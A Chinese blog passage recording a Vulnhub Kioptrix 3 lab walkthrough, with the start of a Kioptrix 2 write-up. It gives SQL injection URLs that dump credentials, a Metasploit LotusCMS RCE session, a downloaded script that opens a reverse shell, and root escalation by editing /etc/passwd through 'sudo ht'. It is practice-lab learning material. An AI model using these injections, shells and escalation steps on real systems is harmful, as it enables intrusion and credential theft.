<p>无法登录，另外找到一个登录的地方<code>http://kioptrix3.com/gallery/gadmin/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery</span><br><span class="line">Table: gallarific_users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | n0t7t1k4 |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
<p>但是可以登录。</p>
<p>这里虽然可以是<code>root</code>和<code>dba</code>权限，但是没有绝对路径。不能直接用sqlmap进行写shell。</p>
<h3><span id="手注sqli">手注sqli</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#</span><br></pre></td></tr></table></figure>
<p>判断一共有6列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_9.png" alt=""></p>
<p>得到当前数据库和版本号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema%20=%20database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_10.png" alt=""></p>
<p>得到当前数据库所有的表名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name%20=0x6465765f6163636f756e7473#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_11.png" alt=""></p>
<p>获取表里的列名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_12.png" alt=""></p>
<h3><span id="lotus-cms-漏洞">Lotus CMS 漏洞</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit Lotus CMS</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                         |  Path</span><br><span class="line">                                                       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py</span><br><span class="line">Lotus Core CMS 1.0.1 - Remote File Inclusion           | exploits/php/webapps/5866.txt</span><br><span class="line">LotusCMS 3.0 - &apos;eval()&apos; Remote Command Execution (Meta | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities              | exploits/php/webapps/16982.txt</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>从查询结果看，有一个本地文件包含和一个远程代码执行，</p>
<p>这里的本地文件包含就是我们之前发现的那个。我们尝试下这个本地文件包含漏洞</p>
<p>尝试发现这个漏洞好像不行。</p>
<p>尝试<code>LotusCMS 3.0 - &#39;eval()&#39; Remote Command Execution</code> 发现是一个rb文件。</p>
<p>于是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search LotusCMS</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                              Disclosure Date  Rank       Description</span><br><span class="line">   ----                              ---------------  ----       -----------</span><br><span class="line">   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution</span><br></pre></td></tr></table></figure>
<p>利用这个漏洞进行攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/lcms_php_exec </span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.58</span><br><span class="line">RHOST =&gt; 192.168.43.58</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set PAYLOAD generic/shell_bind_tcp </span><br><span class="line">PAYLOAD =&gt; generic/shell_bind_tcp</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set URI /</span><br><span class="line">URi =&gt; /</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST    192.168.43.58    yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /                yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.58    no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.43.58:80) was unreachable.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.158</span><br><span class="line">RHOST =&gt; 192.168.43.158</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 1 opened (192.168.43.177:44505 -&gt; 192.168.43.158:4444) at 2018-05-08 10:02:56 -0400</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">ls</span><br><span class="line">cache</span><br><span class="line">core</span><br><span class="line">data</span><br><span class="line">favicon.ico</span><br><span class="line">gallery</span><br><span class="line">gnu-lgpl.txt</span><br><span class="line">index.php</span><br><span class="line">modules</span><br><span class="line">style</span><br><span class="line">update.php</span><br><span class="line">pwd </span><br><span class="line">/home/www/kioptrix3.com</span><br></pre></td></tr></table></figure>
<p>我尝试用<code>cd</code>命令进入<code>gallery</code>目录但是不行，</p>
<p>这里用到<code>ls -l</code>可以看到<code>gallery</code>目录的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ls -l gallery</span><br><span class="line">total 156</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure>
<p>发现<code>gconfig.php</code>配置文件，<code>cat</code>读配置文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span><br><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure>
<h3><span id="lotusrcesh">lotusRCE.sh</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# chmod +x lotusRCE.sh</span><br><span class="line">root@kali:~# ./lotusRCE.sh 192.168.43.158</span><br><span class="line"></span><br><span class="line">Path found, now to check for vuln....</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;Hood3dRob1n</span><br><span class="line">Regex found, site is vulnerable to PHP Code Injection!</span><br><span class="line"></span><br><span class="line">About to try and inject reverse shell....</span><br><span class="line">what IP to use?</span><br><span class="line">192.168.43.177</span><br><span class="line">What PORT?</span><br><span class="line">2333</span><br><span class="line"></span><br><span class="line">OK, open your local listener and choose the method for back connect: </span><br><span class="line">1) NetCat -e	    3) NetCat Backpipe	5) Exit</span><br><span class="line">2) NetCat /dev/tcp  4) NetCat FIFO</span><br><span class="line">#? 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# nc -lvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.43.177] from kioptrix3.com [192.168.43.158] 56259</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<h2><span id="权限提升">权限提升</span></h2><p>尝试用之前SQL注入得到的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure></p>
<p>进行SSH连接，发现第一个账号不能没有多大的作用，不能提权。</p>
<p>连接第二个账号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span><br><span class="line">loneferret@Kioptrix3:~$ ls</span><br><span class="line">checksec.sh  CompanyPolicy.README</span><br></pre></td></tr></table></figure>
<p>存在一个<code>CompanyPolicy.README</code>文件.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checksec.sh  CompanyPolicy.README</span><br><span class="line">loneferret@Kioptrix3:~$ cat CompanyPolicy.README </span><br><span class="line">Hello new employee,</span><br><span class="line">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br><span class="line">Please use the command &apos;sudo ht&apos;.</span><br><span class="line">Failure to do so will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">CEO</span><br></pre></td></tr></table></figure>
<p>英语比较垃圾，百度翻译的意思是可以通过<code>sudo ht</code>对文件进行编辑，创建。</p>
<p>在kali下尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>
<p>报错不能打开一个<code>xterm-256color.</code>终端。</p>
<p>回到本地环境用<code>xshell</code>连接是可以打开的</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_13.png" alt=""></p>
<p>此时按<code>F3</code>，可以输入<code>/etc/passwd</code>或者<code>/etc/sudoers</code>文件来进行文件编辑</p>
<p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_14.png" alt=""></p>
<p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_15.png" alt=""></p>
<p>重新登录SSH。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Last login: Tue May  8 19:27:01 2018 from uknow-pc</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),100(users)</span><br><span class="line">root@Kioptrix3:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>此时已经是<code>root</code>权限了。</p>
<h2><span id="总结">总结</span></h2><p>这次实验过程挺长的，发现了很多地方的问题，第一是发现了<code>phpmyadmin</code>我尝试用写日志的方法试试能不能拿到shell。但是发现<code>phpmyadmin</code>变量了不存在<code>general log</code>变量。</p>
<p>另外就是这里有个SQL注入，可以用<code>sqlmap</code>跑出来，是<code>root</code>权限。尝试用<code>os-shell</code>写shell。通过了之前用远程命令执行得到的绝对路径，但是还是无法写入。好像是目录权限的问题。</p>
<p>在<code>phpmyadmin</code>下也无法执行<code>INTO OUTFILE</code>函数。显示<code>#1 - Can&#39;t create/write to file</code>。从在命令执行里也看得出来目录是没有权限的。</p>
<p>在最后补充了一个文件包含和后台上传的利用，这个组合通过文件包含执行图片木马，得到一个shell。虽然说很鸡肋，还是感觉有点厉害的。</p>
<p>在实验过程中还是想多多尝试多种方法的，但是实验环境还是有限。但在这次实验中还是学到了很多，做了几次<code>vulnhub</code>的实验了，感觉提权方面还是有学习到很多。</p>
<p>虽然说这些环境有点不常见甚至奇葩，但是还是在这个过程中学到了<code>linux</code>环境下的一些之前一直匮乏的知识。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Vulnhub渗透测试练习-Kioptrix 2]]></title>
      <url>https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-2.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="信息收集">信息收集</span></h2><p>同样是<code>netdiscover</code>收集信息，发现目标IP地址。</p>
<p>目标的IP地址为<code>192.168.43.47</code></p>
<p>nmap扫描端口信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A -T4 192.168.43.47</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-07 05:01 EDT</span><br><span class="line">Nmap scan report for 192.168.43.47</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1            841/udp  status</span><br><span class="line">|_  100024  1            844/tcp  status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2018-05-07T05:51:42+00:00; -3h09m44s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h09m44s, deviation: 0s, median: -3h09m44s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP 